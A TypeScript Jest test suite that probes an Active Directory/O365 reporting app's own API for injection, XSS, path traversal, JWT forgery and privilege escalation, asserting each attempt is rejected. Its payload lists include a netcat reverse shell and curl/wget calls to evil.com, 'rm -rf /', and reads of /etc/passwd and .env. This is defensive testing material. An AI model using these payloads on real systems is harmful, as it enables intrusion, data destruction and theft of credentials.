/**
 * Comprehensive Security Test Suite for AD/Azure AD/O365 Reporting Application
 * 
 * This test suite provides extensive security testing capabilities covering:
 * - Authentication bypass attempts
 * - Authorization and privilege escalation
 * - Injection vulnerabilities (SQL, LDAP, XSS)
 * - Input validation and sanitization
 * - Session management security
 * - Token security and manipulation
 * - Data exposure and information disclosure
 * - Configuration security
 * - Infrastructure security
 */

import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import request from 'supertest';
import jwt from 'jsonwebtoken';
import app from '@/app';
import { db } from '@/config/database';
import { logger } from '@/utils/logger';

interface SecurityTestContext {
  validToken: string;
  adminToken: string;
  expiredToken: string;
  maliciousPayloads: MaliciousPayloads;
  testUserId: number;
  adminUserId: number;
}

interface MaliciousPayloads {
  sqlInjection: string[];
  ldapInjection: string[];
  xssPayloads: string[];
  pathTraversal: string[];
  commandInjection: string[];
  jsonPayloads: any[];
}

class SecurityTestRunner {
  private context: SecurityTestContext;
  private baseUrl = '/api';

  constructor() {
    this.context = {} as SecurityTestContext;
  }

  async setup(): Promise<void> {
    // Setup test users and tokens
    await this.createTestUsers();
    await this.generateTestTokens();
    this.setupMaliciousPayloads();
  }

  async cleanup(): Promise<void> {
    try {
      // Clean up test data
      await db.query('DELETE FROM users WHERE username LIKE $1', ['test_security_%']);
      await db.query('DELETE FROM report_history WHERE user_id IN (SELECT id FROM users WHERE username LIKE $1)', ['test_security_%']);
    } catch (error) {
      logger.warn('Cleanup error:', error);
    }
  }

  private async createTestUsers(): Promise<void> {
    // Create regular test user
    const userResult = await db.query(`
      INSERT INTO users (username, password_hash, email, is_active, is_admin, auth_source)
      VALUES ($1, $2, $3, $4, $5, $6)
      RETURNING id
    `, ['test_security_user', 'hashed_password', 'security-test@example.com', true, false, 'local']);
    this.context.testUserId = userResult.rows[0].id;

    // Create admin test user
    const adminResult = await db.query(`
      INSERT INTO users (username, password_hash, email, is_active, is_admin, auth_source)
      VALUES ($1, $2, $3, $4, $5, $6)
      RETURNING id
    `, ['test_security_admin', 'hashed_password', 'security-admin@example.com', true, true, 'local']);
    this.context.adminUserId = adminResult.rows[0].id;
  }

  private async generateTestTokens(): Promise<void> {
    const secret = process.env.JWT_SECRET || 'test-secret';
    
    // Valid user token
    this.context.validToken = jwt.sign(
      { 
        userId: this.context.testUserId, 
        username: 'test_security_user',
        isAdmin: false,
        authSource: 'local',
        sessionId: 'session-123'
      },
      secret,
      { expiresIn: '1h' }
    );

    // Valid admin token
    this.context.adminToken = jwt.sign(
      { 
        userId: this.context.adminUserId, 
        username: 'test_security_admin',
        isAdmin: true,
        authSource: 'local',
        sessionId: 'admin-session-123'
      },
      secret,
      { expiresIn: '1h' }
    );

    // Expired token
    this.context.expiredToken = jwt.sign(
      { 
        userId: this.context.testUserId, 
        username: 'test_security_user',
        isAdmin: false,
        authSource: 'local'
      },
      secret,
      { expiresIn: '-1h' }
    );
  }

  private setupMaliciousPayloads(): void {
    this.context.maliciousPayloads = {
      sqlInjection: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users (username, is_admin) VALUES ('hacker', true); --",
        "' UNION SELECT password_hash FROM users WHERE username='admin' --",
        "'; UPDATE users SET is_admin=true WHERE id=1; --",
        "' OR 1=1; DELETE FROM report_history; --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' AND SLEEP(5) --",
        "'; SELECT * FROM information_schema.tables; --",
        "' OR (SELECT COUNT(*) FROM users) > 0 --"
      ],
      ldapInjection: [
        "*)(&(objectClass=user)(cn=admin))",
        "*)(|(cn=*))(|(cn=*",
        "admin)(|(password=*))",
        "*)(&(objectClass=*)",
        "*))%00",
        "\\2a)(|(objectClass=*",
        "admin)(&(objectClass=user)(userpassword=*))",
        "*)(cn=admin))(&(|(cn=*",
        "*))(|(objectClass=*)(&(cn=admin)",
        "admin*)(|(objectClass=user)"
      ],
      xssPayloads: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>"
      ],
      pathTraversal: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/var/log/auth.log",
        "../.env",
        "../../docker-compose.yml",
        "../package.json"
      ],
      commandInjection: [
        "; cat /etc/passwd",
        "| ls -la",
        "&& whoami",
        "`id`",
        "$(uname -a)",
        "; ping -c 1 evil.com",
        "| curl evil.com",
        "&& rm -rf /",
        "; nc -e /bin/sh evil.com 4444",
        "$(wget evil.com/shell.sh)"
      ],
      jsonPayloads: [
        { "__proto__": { "isAdmin": true } },
        { "constructor": { "prototype": { "isAdmin": true } } },
        { "userId": "../admin" },
        { "reportId": { "$ne": null } },
        { "filters": { "$where": "this.username === 'admin'" } },
        { "query": { "$eval": "db.users.find()" } },
        { "data": "\\u0000\\u0001\\u0002" },
        { "huge_array": new Array(1000000).fill("x") },
        { "deep_nesting": this.createDeepNestedObject(1000) },
        { "circular": this.createCircularReference() }
      ]
    };
  }

  private createDeepNestedObject(depth: number): any {
    let obj: any = { value: "deep" };
    for (let i = 0; i < depth; i++) {
      obj = { nested: obj };
    }
    return obj;
  }

  private createCircularReference(): any {
    const obj: any = { name: "circular" };
    obj.self = obj;
    return obj;
  }

  // =====================================================
  // AUTHENTICATION BYPASS TESTS
  // =====================================================

  async testAuthenticationBypass(): Promise<void> {
    const bypassAttempts = [
      { name: 'No token', headers: {} },
      { name: 'Empty token', headers: { 'Authorization': 'Bearer ' } },
      { name: 'Invalid Bearer format', headers: { 'Authorization': 'Basic invalid' } },
      { name: 'Malformed JWT', headers: { 'Authorization': 'Bearer invalid.jwt.token' } },
      { name: 'Expired token', headers: { 'Authorization': `Bearer ${this.context.expiredToken}` } },
      { name: 'Wrong secret', headers: { 'Authorization': 'Bearer ' + jwt.sign({userId: 1}, 'wrong-secret') } },
      { name: 'None algorithm', headers: { 'Authorization': 'Bearer ' + jwt.sign({userId: 1, alg: 'none'}, '') } },
      { name: 'SQL injection in header', headers: { 'Authorization': "Bearer '; DROP TABLE users; --" } },
      { name: 'Header injection', headers: { 'Authorization': "Bearer token\r\nX-Admin: true" } },
      { name: 'Unicode bypass', headers: { 'Authorization': 'Bearer \u0000invalid' } }
    ];

    describe('Authentication Bypass Tests', () => {
      for (const attempt of bypassAttempts) {
        test(`Should block ${attempt.name}`, async () => {
          const response = await request(app)
            .get(`${this.baseUrl}/reports`)
            .set(attempt.headers);
          
          expect(response.status).toBeGreaterThanOrEqual(401);
          expect(response.body).not.toHaveProperty('reports');
        });
      }
    });
  }

  // =====================================================
  // PRIVILEGE ESCALATION TESTS
  // =====================================================

  async testPrivilegeEscalation(): Promise<void> {
    describe('Privilege Escalation Tests', () => {
      test('Regular user cannot access admin endpoints', async () => {
        const adminEndpoints = [
          '/admin/users',
          '/admin/security',
          '/admin/system',
          '/admin/logs',
          '/admin/configuration'
        ];

        for (const endpoint of adminEndpoints) {
          const response = await request(app)
            .get(`${this.baseUrl}${endpoint}`)
            .set('Authorization', `Bearer ${this.context.validToken}`);
          
          expect(response.status).toBe(403);
        }
      });

      test('Token manipulation for privilege escalation', async () => {
        const manipulatedPayloads = [
          { userId: this.context.testUserId, isAdmin: true },
          { userId: 1, isAdmin: true },  // Assume user ID 1 is admin
          { userId: this.context.testUserId, roles: ['admin'] },
          { userId: this.context.testUserId, authSource: 'system' },
          { userId: this.context.testUserId, permissions: ['*'] }
        ];

        for (const payload of manipulatedPayloads) {
          const maliciousToken = jwt.sign(payload, process.env.JWT_SECRET || 'test-secret');
          
          const response = await request(app)
            .get(`${this.baseUrl}/admin/users`)
            .set('Authorization', `Bearer ${maliciousToken}`);
          
          expect(response.status).toBe(403);
        }
      });

      test('Session hijacking attempts', async () => {
        const hijackAttempts = [
          { sessionId: 'admin-session-123' },
          { sessionId: '../admin' },
          { sessionId: '../../root' },
          { sessionId: null },
          { sessionId: { $ne: null } }
        ];

        for (const attempt of hijackAttempts) {
          const token = jwt.sign(
            { userId: this.context.testUserId, ...attempt },
            process.env.JWT_SECRET || 'test-secret'
          );
          
          const response = await request(app)
            .get(`${this.baseUrl}/admin/users`)
            .set('Authorization', `Bearer ${token}`);
          
          expect(response.status).toBe(403);
        }
      });
    });
  }

  // =====================================================
  // SQL INJECTION TESTS
  // =====================================================

  async testSQLInjection(): Promise<void> {
    describe('SQL Injection Tests', () => {
      test('SQL injection in search parameters', async () => {
        for (const payload of this.context.maliciousPayloads.sqlInjection) {
          const response = await request(app)
            .get(`${this.baseUrl}/search`)
            .query({ q: payload, type: 'users' })
            .set('Authorization', `Bearer ${this.context.validToken}`);
          
          // Should not return database error or expose sensitive data
          expect(response.status).not.toBe(500);
          expect(JSON.stringify(response.body)).not.toMatch(/DROP|INSERT|UPDATE|DELETE|password_hash/i);
        }
      });

      test('SQL injection in report filters', async () => {
        for (const payload of this.context.maliciousPayloads.sqlInjection) {
          const response = await request(app)
            .post(`${this.baseUrl}/reports/execute/1`)
            .send({
              filters: [
                { field: 'username', operator: 'equals', value: payload }
              ]
            })
            .set('Authorization', `Bearer ${this.context.validToken}`);
          
          expect(response.status).not.toBe(500);
          expect(JSON.stringify(response.body)).not.toMatch(/DROP|INSERT|UPDATE|DELETE/i);
        }
      });

      test('SQL injection in sort parameters', async () => {
        for (const payload of this.context.maliciousPayloads.sqlInjection) {
          const response = await request(app)
            .get(`${this.baseUrl}/logs`)
            .query({ sortBy: payload, sortOrder: 'asc' })
            .set('Authorization', `Bearer ${this.context.validToken}`);
          
          expect(response.status).toBeLessThan(500);
        }
      });
    });
  }

  // =====================================================
  // LDAP INJECTION TESTS
  // =====================================================

  async testLDAPInjection(): Promise<void> {
    describe('LDAP Injection Tests', () => {
      test('LDAP injection in user search', async () => {
        for (const payload of this.context.maliciousPayloads.ldapInjection) {
          const response = await request(app)
            .post(`${this.baseUrl}/reports/execute/inactive_users`)
            .send({
              parameters: { username: payload }
            })
            .set('Authorization', `Bearer ${this.context.validToken}`);
          
          // Should not return LDAP errors or unauthorized data
          expect(JSON.stringify(response.body)).not.toMatch(/LDAP|objectClass|distinguishedName/i);
        }
      });

      test('LDAP injection in authentication', async () => {
        for (const payload of this.context.maliciousPayloads.ldapInjection) {
          const response = await request(app)
            .post(`${this.baseUrl}/auth/login`)
            .send({
              username: payload,
              password: 'password'
            });
          
          expect(response.status).toBe(401);
        }
      });
    });
  }

  // =====================================================
  // XSS TESTS
  // =====================================================

  async testXSSVulnerabilities(): Promise<void> {
    describe('XSS Vulnerability Tests', () => {
      test('XSS in report names', async () => {
        for (const payload of this.context.maliciousPayloads.xssPayloads) {
          const response = await request(app)
            .post(`${this.baseUrl}/reports/custom`)
            .send({
              name: payload,
              description: 'Test report',
              query: { source: 'ad', fields: ['username'] }
            })
            .set('Authorization', `Bearer ${this.context.validToken}`);
          
          if (response.status === 200 || response.status === 201) {
            expect(response.body.name).not.toContain('<script>');
            expect(response.body.name).not.toContain('javascript:');
          }
        }
      });

      test('XSS in log messages', async () => {
        for (const payload of this.context.maliciousPayloads.xssPayloads) {
          const response = await request(app)
            .get(`${this.baseUrl}/logs`)
            .query({ message: payload })
            .set('Authorization', `Bearer ${this.context.validToken}`);
          
          expect(JSON.stringify(response.body)).not.toContain('<script>');
          expect(JSON.stringify(response.body)).not.toContain('javascript:');
        }
      });
    });
  }

  // =====================================================
  // INPUT VALIDATION TESTS
  // =====================================================

  async testInputValidation(): Promise<void> {
    describe('Input Validation Tests', () => {
      test('Path traversal in file downloads', async () => {
        for (const payload of this.context.maliciousPayloads.pathTraversal) {
          const response = await request(app)
            .get(`${this.baseUrl}/export/${payload}`)
            .set('Authorization', `Bearer ${this.context.validToken}`);
          
          expect(response.status).not.toBe(200);
          expect(response.body).not.toContain('root:');
          expect(response.body).not.toContain('password');
        }
      });

      test('Command injection in parameters', async () => {
        for (const payload of this.context.maliciousPayloads.commandInjection) {
          const response = await request(app)
            .post(`${this.baseUrl}/reports/execute/1`)
            .send({
              parameters: { command: payload }
            })
            .set('Authorization', `Bearer ${this.context.validToken}`);
          
          expect(JSON.stringify(response.body)).not.toMatch(/uid=|gid=|total|drwx/);
        }
      });

      test('JSON payload attacks', async () => {
        for (const payload of this.context.maliciousPayloads.jsonPayloads) {
          try {
            const response = await request(app)
              .post(`${this.baseUrl}/reports/custom`)
              .send(payload)
              .set('Authorization', `Bearer ${this.context.validToken}`);
            
            // Should handle malformed JSON gracefully
            expect(response.status).toBeLessThan(500);
          } catch (error) {
            // JSON parse errors are acceptable
            expect(error).toBeDefined();
          }
        }
      });
    });
  }

  // =====================================================
  // SESSION SECURITY TESTS
  // =====================================================

  async testSessionSecurity(): Promise<void> {
    describe('Session Security Tests', () => {
      test('Session fixation attacks', async () => {
        const fixedSessionId = 'fixed-session-123';
        
        // Try to login with fixed session
        const loginResponse = await request(app)
          .post(`${this.baseUrl}/auth/login`)
          .set('Cookie', `sessionId=${fixedSessionId}`)
          .send({
            username: 'test_security_user',
            password: 'password'
          });
        
        // Session ID should change after login
        expect(loginResponse.headers['set-cookie']).toBeDefined();
        if (loginResponse.headers['set-cookie']) {
          const newSessionId = (loginResponse.headers['set-cookie'] as unknown as string[])
            .find((cookie: string) => cookie.startsWith('sessionId='));
          expect(newSessionId).not.toContain(fixedSessionId);
        }
      });

      test('Concurrent session limits', async () => {
        const tokens = [];
        
        // Create multiple sessions for same user
        for (let i = 0; i < 10; i++) {
          const token = jwt.sign(
            { userId: this.context.testUserId, sessionId: `session-${i}` },
            process.env.JWT_SECRET || 'test-secret'
          );
          tokens.push(token);
        }
        
        // All tokens should be validated properly
        let validSessions = 0;
        for (const token of tokens) {
          const response = await request(app)
            .get(`${this.baseUrl}/health`)
            .set('Authorization', `Bearer ${token}`);
          
          if (response.status === 200) validSessions++;
        }
        
        // Should limit concurrent sessions or track them properly
        expect(validSessions).toBeLessThanOrEqual(tokens.length);
      });
    });
  }

  // =====================================================
  // TOKEN SECURITY TESTS
  // =====================================================

  async testTokenSecurity(): Promise<void> {
    describe('Token Security Tests', () => {
      test('JWT algorithm confusion', async () => {
        const algorithms = ['none', 'HS256', 'RS256', 'ES256'];
        
        for (const alg of algorithms) {
          try {
            const maliciousToken = jwt.sign(
              { userId: this.context.testUserId, alg },
              alg === 'none' ? '' : 'wrong-secret',
              alg === 'none' ? { algorithm: 'none' } : { algorithm: alg as any }
            );
            
            const response = await request(app)
              .get(`${this.baseUrl}/reports`)
              .set('Authorization', `Bearer ${maliciousToken}`);
            
            expect(response.status).toBe(401);
          } catch (error) {
            // JWT signing errors are expected for invalid algorithms
            expect(error).toBeDefined();
          }
        }
      });

      test('Token replay attacks', async () => {
        const token = this.context.validToken;
        
        // Use same token multiple times rapidly
        const requests = Array(10).fill(null).map(() =>
          request(app)
            .get(`${this.baseUrl}/reports`)
            .set('Authorization', `Bearer ${token}`)
        );
        
        const responses = await Promise.all(requests);
        
        // All should succeed (no replay protection expected)
        // But rate limiting should kick in
        const successCount = responses.filter(r => r.status === 200).length;
        expect(successCount).toBeGreaterThan(0);
      });

      test('Token encryption bypass', async () => {
        try {
          // Try to create token with weak encryption
          const weakData = {
            encrypted: 'weak-encryption',
            salt: 'short',
            iv: 'short',
            authTag: 'short',
            version: 'v1'
          };
          
          const response = await request(app)
            .post(`${this.baseUrl}/auth/refresh`)
            .send({ refreshToken: JSON.stringify(weakData) });
          
          expect(response.status).toBe(401);
        } catch (error) {
          expect(error).toBeDefined();
        }
      });
    });
  }

  // =====================================================
  // INFORMATION DISCLOSURE TESTS
  // =====================================================

  async testInformationDisclosure(): Promise<void> {
    describe('Information Disclosure Tests', () => {
      test('Error message information leakage', async () => {
        const errorTriggers = [
          '/api/nonexistent',
          '/api/reports/999999',
          '/api/users/invalid-id',
          '/api/health/invalid-component'
        ];
        
        for (const endpoint of errorTriggers) {
          const response = await request(app)
            .get(endpoint)
            .set('Authorization', `Bearer ${this.context.validToken}`);
          
          // Should not expose internal paths, database details, etc.
          expect(JSON.stringify(response.body)).not.toMatch(/\/home\/|\/var\/|C:\\|password|secret|key/i);
        }
      });

      test('Debug information exposure', async () => {
        const response = await request(app)
          .get(`${this.baseUrl}/health/detailed`)
          .set('Authorization', `Bearer ${this.context.validToken}`);
        
        if (response.status === 200) {
          // Should not expose sensitive configuration
          expect(JSON.stringify(response.body)).not.toMatch(/password|secret|key|token/i);
        }
      });

      test('Directory listing attacks', async () => {
        const directories = [
          '/uploads/',
          '/exports/',
          '/logs/',
          '/config/',
          '/src/'
        ];
        
        for (const dir of directories) {
          const response = await request(app).get(dir);
          expect(response.status).not.toBe(200);
        }
      });
    });
  }

  // =====================================================
  // RATE LIMITING TESTS
  // =====================================================

  async testRateLimiting(): Promise<void> {
    describe('Rate Limiting Tests', () => {
      test('API rate limiting enforcement', async () => {
        const requests = Array(50).fill(null).map(() =>
          request(app)
            .get(`${this.baseUrl}/reports`)
            .set('Authorization', `Bearer ${this.context.validToken}`)
        );
        
        const responses = await Promise.all(requests);
        const rateLimitedCount = responses.filter(r => r.status === 429).length;
        
        expect(rateLimitedCount).toBeGreaterThan(0);
      });

      test('Login attempt rate limiting', async () => {
        const attempts = Array(20).fill(null).map(() =>
          request(app)
            .post(`${this.baseUrl}/auth/login`)
            .send({ username: 'test_user', password: 'wrong_password' })
        );
        
        const responses = await Promise.all(attempts);
        const blockedCount = responses.filter(r => r.status === 429).length;
        
        expect(blockedCount).toBeGreaterThan(0);
      });
    });
  }

  // =====================================================
  // CONFIGURATION SECURITY TESTS
  // =====================================================

  async testConfigurationSecurity(): Promise<void> {
    describe('Configuration Security Tests', () => {
      test('Environment variable exposure', async () => {
        const response = await request(app)
          .get(`${this.baseUrl}/health/detailed`)
          .set('Authorization', `Bearer ${this.context.adminToken}`);
        
        if (response.status === 200) {
          const body = JSON.stringify(response.body);
          expect(body).not.toMatch(/JWT_SECRET|DATABASE_URL|ENCRYPTION_KEY/);
        }
      });

      test('Default credentials check', async () => {
        const defaultCreds = [
          { username: 'admin', password: 'admin' },
          { username: 'admin', password: 'password' },
          { username: 'administrator', password: 'administrator' },
          { username: 'root', password: 'root' },
          { username: 'user', password: 'user' }
        ];
        
        for (const cred of defaultCreds) {
          const response = await request(app)
            .post(`${this.baseUrl}/auth/login`)
            .send(cred);
          
          expect(response.status).toBe(401);
        }
      });
    });
  }

  // =====================================================
  // MAIN TEST EXECUTOR
  // =====================================================

  async runAllTests(): Promise<void> {
    await this.setup();
    
    try {
      await this.testAuthenticationBypass();
      await this.testPrivilegeEscalation();
      await this.testSQLInjection();
      await this.testLDAPInjection();
      await this.testXSSVulnerabilities();
      await this.testInputValidation();
      await this.testSessionSecurity();
      await this.testTokenSecurity();
      await this.testInformationDisclosure();
      await this.testRateLimiting();
      await this.testConfigurationSecurity();
    } finally {
      await this.cleanup();
    }
  }
}

// Export test runner for use in other test files
export { SecurityTestRunner };

// Main test suite execution
describe('Comprehensive Security Test Suite', () => {
  let testRunner: SecurityTestRunner;

  beforeAll(async () => {
    testRunner = new SecurityTestRunner();
    await testRunner.setup();
  });

  afterAll(async () => {
    await testRunner.cleanup();
  });

  test('Execute all security tests', async () => {
    await testRunner.runAllTests();
  }, 60000); // 60 second timeout for comprehensive tests
});